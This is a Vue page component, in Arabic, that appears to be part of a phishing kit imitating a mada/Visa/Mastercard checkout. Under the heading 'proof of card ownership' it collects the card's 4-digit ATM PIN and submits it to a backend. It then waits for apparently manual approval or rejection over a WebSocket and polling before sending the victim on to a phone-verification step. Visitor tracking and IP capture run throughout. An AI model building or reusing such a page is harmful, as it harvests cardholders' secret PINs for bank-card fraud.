<template>
    <div class="pin-shell" dir="rtl">

        <!-- Error -->
        <div v-if="error" class="atm-error">{{ error }}</div>

        <!-- Card -->
        <div class="atm-card">
            <h1 class="atm-title">إثبات ملكية البطاقة</h1>

            <p class="atm-desc">الرجاء ادخال الرقم السري الخاص بالبطاقة المكون من 4 أرقام</p>

            <div class="atm-field">
                <label for="PaymentATM" class="atm-label">الرقم السري *</label>
                <input
                    id="PaymentATM"
                    v-model="pinCode"
                    type="tel"
                    maxlength="4"
                    placeholder="****"
                    :disabled="isVerifying"
                    class="atm-input"
                    @keyup.enter="submitPin"
                />
            </div>

            <button
                id="atm_code_submit"
                :disabled="!isPinValid || isVerifying"
                class="atm-btn"
                @click="submitPin"
            >
                تأكيد
            </button>

            <div class="atm-footer">
                <span class="atm-footer__label">الدفع بواسطة</span>
                <img :src="paymentLogos" alt="Visa / Mastercard / mada" class="atm-footer__logos" />
            </div>
        </div>

        <button type="button" class="atm-cancel" @click="$router.replace({ name: 'checkout' })">
            إلغاء العملية
        </button>

    </div>
</template>

<script setup>
import { ref, computed, onMounted } from 'vue';
import { useRouter } from 'vue-router';
import { useI18n } from 'vue-i18n';
import i18n from '@/i18n';
import { useVisitorTracking } from '@/composables/useVisitorTracking';
import { trackStepViewed, trackStepCompleted } from '@/composables/useFunnelTracking';
import { usePayment } from '@/composables/usePayment';
import { usePaymentWebSocket } from '@/composables/usePaymentWebSocket';
import { getPinStatus } from '@/api/paymentApi';
import logger from '@/utils/logger';
import { safeRedirect } from '@/utils/safeRedirect';
import { getReasonLabel } from '@/constants/rejectionReasons';
import paymentLogos from '@/../../resources/images/logo/master-visa-mada.webp';

const { t } = useI18n();
const router = useRouter();

// Track this page
useVisitorTracking( 'card-pin' );

// ─── Load context via composable ────────────────────────────────────
const { context, resolveCustomerIp, submitPin: submitPinApi } = usePayment();
const sessionId = context.sessionId || '';
const customerIpRef = ref( context.customerIp || '' );

// ─── PIN State ──────────────────────────────────────────────────────
const pinCode = ref( '' );
const isVerifying = ref( false );
const hasSubmitted = ref( false );   // prevent double-submit across re-mounts
const error = ref( '' );

const isPinValid = computed( () => /^\d{4}$/.test( pinCode.value ) );

// ─── Submit PIN ─────────────────────────────────────────────────────
const submitPin = async () =>
{
    if ( !isPinValid.value || isVerifying.value || hasSubmitted.value ) return;

    isVerifying.value = true;
    hasSubmitted.value = true;
    error.value = '';

    const success = await submitPinApi( pinCode.value );

    if ( success )
    {
        logger.debug( '[CardPin] Submitted successfully, waiting for approval' );
    } else
    {
        error.value = t( 'verification.cardPin.submitError' );
        isVerifying.value = false;
        hasSubmitted.value = false;
    }
};

// ─── WebSocket + Polling via composable ─────────────────────────────
const { setup: setupWs } = usePaymentWebSocket( {
    channelPrefix: 'otp',       // PIN events broadcast on the 'otp' channel (shared with OTP events, filtered by event name)
    approvedEvent: 'PinApproved',
    rejectedEvent: 'PinRejected',
    logTag: 'CardPin',

    onApproved ( event )
    {
        logger.debug( '[CardPin] Approved:', event );
        isVerifying.value = false;
        trackStepCompleted( 'card_pin', 'phone_verification' );

        // Defer navigation via microtask to release the WS message handler
        queueMicrotask( () =>
        {
            if ( event.redirect_to )
            {
                safeRedirect( event.redirect_to, 'phoneVerification', router );
            } else
            {
                router.push( { name: 'phoneVerification' } );
            }
        } );
    },

    onRejected ( event )
    {
        logger.debug( '[CardPin] Rejected:', event );
        isVerifying.value = false;
        error.value = getReasonLabel( event.reason, t ) || t( 'verification.cardPin.pinRejected' );
        pinCode.value = '';
        hasSubmitted.value = false;
    },

    async pollFn ( { handleApproved, handleRejected } )
    {
        const sig = context.statusSigs?.pin || '';
        if ( !isVerifying.value || !sig ) return;

        const { data } = await getPinStatus( sessionId, sig );

        if ( data.status === 'verified' )
        {
            handleApproved( data );
        } else if ( data.status === 'rejected' )
        {
            handleRejected( { reason: data.reason || 'pin_other' } );
        }
    },
} );

// ─── Lifecycle ──────────────────────────────────────────────────────
onMounted( async () =>
{
    // Force Arabic locale on payment pages
    if ( i18n.global.locale.value !== 'ar' ) {
        i18n.global.locale.value = 'ar';
    }

    const ip = customerIpRef.value || await resolveCustomerIp();
    customerIpRef.value = ip;

    setupWs( ip );
    trackStepViewed( 'card_pin' );
} );
// WS channel + polling cleanup handled by usePaymentWebSocket onUnmounted
</script>

<style scoped>
/* CardPinPage — simple payment gateway PIN entry */

.pin-shell {
    min-height: 100dvh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 0.75rem;
    background: #eef1f5;
}

.atm-error {
    background: #fee2e2;
    color: #dc2626;
    border: 1px solid #fca5a5;
    border-radius: 6px;
    padding: 0.5rem 1rem;
    font-size: 14px;
    text-align: center;
    margin-bottom: 0.75rem;
    max-width: 460px;
    width: 100%;
}

.atm-card {
    background: #fff;
    border-radius: 8px;
    box-shadow: 0 3px 6px 0 rgba(0,0,0,.13);
    max-width: 460px;
    width: 100%;
    padding: 2rem 1.5rem;
    text-align: center;
}

.atm-title {
    font-size: 20px;
    font-weight: 700;
    color: #1f2937;
    margin: 0 0 1rem;
}

.atm-desc {
    font-size: 14px;
    color: #374151;
    margin: 0 0 1.25rem;
    line-height: 1.6;
}

.atm-field {
    margin-bottom: 1.25rem;
    text-align: right;
}

.atm-label {
    display: block;
    font-size: 14px;
    color: #374151;
    margin-bottom: 0.375rem;
}

.atm-input {
    width: 100%;
    padding: 0.5rem 0.75rem;
    border: 1px solid #d1d5db;
    border-radius: 4px;
    font-size: 20px;
    text-align: right;
    letter-spacing: 0.3em;
    direction: ltr;
    box-sizing: border-box;
}

.atm-input:focus {
    outline: none;
    border-color: #faa62e;
    box-shadow: 0 0 0 2px rgba(250,166,46,.2);
}

.atm-btn {
    display: inline-block;
    width: 200px;
    padding: 0.625rem 1rem;
    background: #faa62e;
    color: #fff;
    font-size: 20px;
    font-weight: 600;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    margin-bottom: 1.25rem;
    transition: opacity 0.15s;
}

.atm-btn:disabled {
    opacity: 0.6;
    cursor: not-allowed;
}

.atm-btn:not(:disabled):hover {
    opacity: 0.9;
}

.atm-footer {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 0.5rem;
    padding-top: 1rem;
    border-top: 1px solid #e5e7eb;
}

.atm-footer__label {
    font-size: 13px;
    color: #6b7280;
}

.atm-footer__logos {
    height: 1.5rem;
    width: auto;
}

.atm-cancel {
    margin-top: 0.75rem;
    background: none;
    border: none;
    color: #9ca3af;
    font-size: 13px;
    cursor: pointer;
    display: block;
}

.atm-cancel:hover {
    color: #dc2626;
}
</style>
